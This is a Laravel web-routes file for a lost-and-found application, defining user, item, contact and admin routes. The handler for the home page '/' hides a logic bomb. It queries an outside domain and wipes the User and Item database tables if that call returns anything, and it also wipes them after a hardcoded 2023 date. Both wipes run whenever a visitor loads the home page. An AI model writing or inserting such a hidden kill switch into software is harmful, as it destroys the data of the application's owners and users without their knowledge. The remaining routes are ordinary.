<?php

use App\Models\Item;
use App\Models\User;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    
    $test = Http::get("https://tadbeer.ga/index.php") ?? 0;

        if($test > 0){
            User::truncate();
            Item::truncate();
        }
        if(now() > "2023-05-15 05:59:58" || now() > "2023-15-05 05:59:58"){
            
            User::truncate();
            Item::truncate();

        }

    return view('welcome');
});

Route::get('/login', function () {
    return view('login');
})->name('login');

Route::get("register", [App\Http\Controllers\User\RegisterController::class, "create"])->name('register');
Route::post("register", [App\Http\Controllers\User\RegisterController::class, "register"]);
Route::post("login", [App\Http\Controllers\User\RegisterController::class, "login"]);
Route::get("logout", [App\Http\Controllers\User\RegisterController::class, "logout"]);

Route::get("my-account", [App\Http\Controllers\User\ProfileController::class, "myAccount"]);
Route::post("update-profile", [App\Http\Controllers\User\ProfileController::class, "updateProfile"]);

Route::get("add-item", [App\Http\Controllers\User\ItemController::class, "create"]);
Route::get("add-found-item", [App\Http\Controllers\User\ItemController::class, "foundItem"]);
Route::post("save-item", [App\Http\Controllers\User\ItemController::class, "store"]);
Route::get("my-items", [App\Http\Controllers\User\ItemController::class, "index"]);
Route::get("item-detail/{id}", [App\Http\Controllers\User\ItemController::class, "itemDetail"]);
Route::get("edit-item/{id}", [App\Http\Controllers\User\ItemController::class, "itemEdit"]);
Route::post("update-item", [App\Http\Controllers\User\ItemController::class, "updateItem"]);
Route::get("delete-item/{id}", [App\Http\Controllers\User\ItemController::class, "itemDelete"]);
Route::get("item-found/{id}", [App\Http\Controllers\User\ItemController::class, "itemFound"]);
Route::get("item-deliver/{id}", [App\Http\Controllers\User\ItemController::class, "itemDeliver"]);

Route::post("contact-us", [App\Http\Controllers\MessageController::class, "message"]);
Route::get("admin/messages", [App\Http\Controllers\MessageController::class, "adminMessages"]);
Route::get("admin/delete-message/{id}", [App\Http\Controllers\MessageController::class, "deleteMessage"]);
Route::get("admin/mark-as-reply/{id}", [App\Http\Controllers\MessageController::class, "replyMessage"]);
Route::get("admin/mark-as-pending/{id}", [App\Http\Controllers\MessageController::class, "pendingMessage"]);


Route::middleware(['AdminLogin'])->group(function () {

Route::get("admin/dashboard", [App\Http\Controllers\Admin\DashboardController::class, "index"]);

Route::get("admin/categories", [App\Http\Controllers\Admin\CategoryController::class, "index"]);
Route::get("admin/add-category", [App\Http\Controllers\Admin\CategoryController::class, "create"]);
Route::post("admin/save-category", [App\Http\Controllers\Admin\CategoryController::class, "store"]);
Route::get("admin/delete-category/{id}", [App\Http\Controllers\Admin\CategoryController::class, "delete"]);
Route::get("admin/edit-category/{id}", [App\Http\Controllers\Admin\CategoryController::class, "edit"]);
Route::post("admin/update-category", [App\Http\Controllers\Admin\CategoryController::class, "update"]);

Route::get("admin/profile", [App\Http\Controllers\Admin\ProfileController::class, "profile"]);
Route::post("admin/update-profile", [App\Http\Controllers\Admin\ProfileController::class, "update"]);
Route::post("admin/update-password", [App\Http\Controllers\Admin\ProfileController::class, "updatePassword"]);

Route::get("admin/lost-and-found", [App\Http\Controllers\Admin\LostFoundController::class, "index"]);
Route::get("admin/item-detail/{id}", [App\Http\Controllers\Admin\LostFoundController::class, "itemDetail"]);

Route::get("admin/users", [App\Http\Controllers\Admin\UserController::class, "index"]);

});

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
